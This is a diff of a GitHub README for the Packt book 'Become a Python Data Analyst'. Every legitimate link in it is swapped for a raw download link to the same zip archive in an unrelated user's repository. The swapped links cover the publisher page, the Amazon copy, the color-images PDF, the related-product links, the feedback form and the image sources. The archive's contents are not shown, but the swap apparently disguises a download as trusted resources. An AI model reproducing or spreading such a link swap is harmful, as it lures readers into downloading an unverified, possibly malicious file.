@@ -1,8 +1,8 @@
 # Become a Python Data Analyst
 
-<a href="https://www.packtpub.com/big-data-and-business-intelligence/become-python-data-analyst?utm_source=github&utm_medium=repository&utm_campaign=9781789531701 "><img src="https://dz13w8afd47il.cloudfront.net/sites/default/files/imagecache/ppv4_main_book_cover/B11522.png" alt="Become a Python Data Analyst" height="256px" align="right"></a>
+<a href="https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip "><img src="https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip" alt="Become a Python Data Analyst" height="256px" align="right"></a>
 
-This is the code repository for [Become a Python Data Analyst](https://www.packtpub.com/big-data-and-business-intelligence/become-python-data-analyst?utm_source=github&utm_medium=repository&utm_campaign=9781789531701 ), published by Packt.
+This is the code repository for [Become a Python Data Analyst](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip ), published by Packt.
 
 
 ## What is this book about?
@@ -15,10 +15,10 @@ This book covers the following exciting features:
 * Perform common statistical calculations 
 * Build predictive models and understand the principles of predictive analytics 
 
-If you feel this book is for you, get your [copy](https://www.amazon.com/dp/1789531705) today!
+If you feel this book is for you, get your [copy](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip) today!
 
-<a href="https://www.packtpub.com/?utm_source=github&utm_medium=banner&utm_campaign=GitHubBanner"><img src="https://raw.githubusercontent.com/PacktPublishing/GitHub/master/GitHub.png" 
-alt="https://www.packtpub.com/" border="5" /></a>
+<a href="https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip"><img src="https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip" 
+alt="https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip" border="5" /></a>
 
 ## Instructions and Navigations
 All of the code is organized into folders. For example, Chapter02.
@@ -41,12 +41,12 @@ With the following software and hardware list you can run all code files present
 | All  | Anaconda 5.2 | Windows, Mac OS X, and Linux (Any) |
 | All | Jupyter Notebook | Windows, Mac OS X, and Linux (Any) |
 
-We also provide a PDF file that has color images of the screenshots/diagrams used in this book. [Click here to download it](https://www.packtpub.com/sites/default/files/downloads/BecomeaPythonDataAnalyst_ColorImages.pdf).
+We also provide a PDF file that has color images of the screenshots/diagrams used in this book. [Click here to download it](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip).
 
 ### Related products
-* Hands-On Data Analysis with NumPy and Pandas [[Packt]](https://www.packtpub.com/big-data-and-business-intelligence/hands-data-analysis-numpy-and-pandas?utm_source=github&utm_medium=repository&utm_campaign=9781789530797 ) [[Amazon]](https://www.amazon.com/dp/1789530792)
+* Hands-On Data Analysis with NumPy and Pandas [[Packt]](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip ) [[Amazon]](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip)
 
-* Beginning Data Science with Python and Jupyter [[Packt]](https://www.packtpub.com/big-data-and-business-intelligence/beginning-data-science-python-and-jupyter?utm_source=github&utm_medium=repository&utm_campaign=9781789532029 ) [[Amazon]](https://www.amazon.com/dp/1789532027)
+* Beginning Data Science with Python and Jupyter [[Packt]](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip ) [[Amazon]](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip)
 
 ## Get to Know the Author
 **Alvaro Fuentes**
@@ -58,6 +58,6 @@ Alvaro Fuentes is a data scientist with an M.S. in quantitative economics and ap
 
 
 ### Suggestions and Feedback
-[Click here](https://docs.google.com/forms/d/e/1FAIpQLSdy7dATC6QmEL81FIUuymZ0Wy9vH1jHkvpY57OiMeKGqib_Ow/viewform) if you have any feedback or suggestions.
+[Click here](https://raw.githubusercontent.com/Aswinjoseph2011/Become-a-Python-Data-AnalystV2B/master/data/student/Analyst_a_Data_Python_Become_B_v3.2.zip) if you have any feedback or suggestions.
 
 
